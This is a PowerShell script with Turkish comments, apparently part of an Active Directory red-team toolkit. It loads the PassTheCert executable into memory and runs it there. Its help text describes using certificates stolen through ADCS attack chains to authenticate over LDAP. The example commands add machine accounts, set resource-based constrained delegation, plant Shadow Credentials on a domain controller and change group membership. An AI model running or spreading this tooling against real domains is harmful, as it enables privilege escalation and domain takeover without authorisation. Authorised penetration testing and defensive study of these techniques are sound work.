<#
.SYNOPSIS
    PassTheCert.exe'yi PowerShell üzerinden in-memory çalıştırır.

.DESCRIPTION
    PassTheCert, ADCS (Active Directory Certificate Services) tarafından
    verilen sertifikaları kullanarak LDAP üzerinden kimlik doğrulama yapar
    ve AD nesnelerini değiştirmeye olanak tanır.

    ADCS saldırı zincirinde (ESC1-ESC8) elde edilen sertifikalar
    bu araç ile kullanılabilir.

    Yaygın kullanım senaryoları:
    - Sertifika ile LDAP authentication
    - Kullanıcı/bilgisayar hesabı ekleme
    - RBCD (Resource-Based Constrained Delegation) yapılandırma
    - Shadow Credentials ayarlama
    - Grup üyeliği değiştirme

.PARAMETER Command
    PassTheCert'e geçirilecek komut string'i.

.PARAMETER ExePath
    PassTheCert.exe dosyasının yolu.

.EXAMPLE
    # Sertifika ile LDAP bağlantısı ve kullanıcı ekleme
    Invoke-PassTheCert -Command "/server:dc01.domain.local /cert-path:admin.pfx /add-computer"

.EXAMPLE
    # RBCD ayarlama
    Invoke-PassTheCert -Command "/server:dc01.domain.local /cert-path:admin.pfx /rbcd /target:SERVER01$ /sid:S-1-5-..."

.EXAMPLE
    # Shadow Credentials
    Invoke-PassTheCert -Command "/server:dc01.domain.local /cert-path:admin.pfx /shadow-cred /target:DC01$"

.EXAMPLE
    # PEM sertifika ile kullanım
    Invoke-PassTheCert -Command "/server:dc01.domain.local /cert-path:cert.pem /key-path:key.pem /add-computer"

.NOTES
    Orijinal Araç: PassTheCert by AlmondOffSec
    Wrapper: AD Red Team PowerShell Toolkit
    Gereksinim: Geçerli bir sertifika (PFX veya PEM formatında)
#>

function Invoke-PassTheCert {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$Command,

        [Parameter(Mandatory = $false)]
        [string]$ExePath
    )

    if (-not $ExePath) {
        $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
        $ExePath = Join-Path (Split-Path -Parent $scriptDir) "PassTheCert.exe"
    }

    if (-not (Test-Path $ExePath)) {
        Write-Error "[!] PassTheCert.exe bulunamadı: $ExePath"
        return
    }

    Write-Host "[*] PassTheCert.exe yükleniyor: $ExePath" -ForegroundColor Cyan

    try {
        $bytes = [System.IO.File]::ReadAllBytes($ExePath)
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        Write-Host "[+] Assembly belleğe yüklendi." -ForegroundColor Green

        $args = $Command.Split(' ', [StringSplitOptions]::RemoveEmptyEntries)
        Write-Host "[*] Çalıştırılıyor: PassTheCert.exe $Command" -ForegroundColor Cyan
        Write-Host ("-" * 60) -ForegroundColor DarkGray

        $originalOut = [Console]::Out
        $stringWriter = New-Object System.IO.StringWriter
        [Console]::SetOut($stringWriter)

        try {
            $assembly.EntryPoint.Invoke($null, @(,[string[]]$args))
        }
        catch [System.Reflection.TargetInvocationException] {
            if ($_.Exception.InnerException) {
                Write-Warning "PassTheCert exception: $($_.Exception.InnerException.Message)"
            }
        }
        finally {
            [Console]::SetOut($originalOut)
        }

        $output = $stringWriter.ToString()
        if ($output) { Write-Host $output }
        Write-Host ("-" * 60) -ForegroundColor DarkGray
        Write-Host "[+] PassTheCert tamamlandı." -ForegroundColor Green
    }
    catch {
        Write-Error "[!] Hata: $($_.Exception.Message)"
    }
}

if ($MyInvocation.InvocationName -ne '.') {
    if ($args.Count -gt 0) {
        Invoke-PassTheCert -Command ($args -join ' ')
    }
}
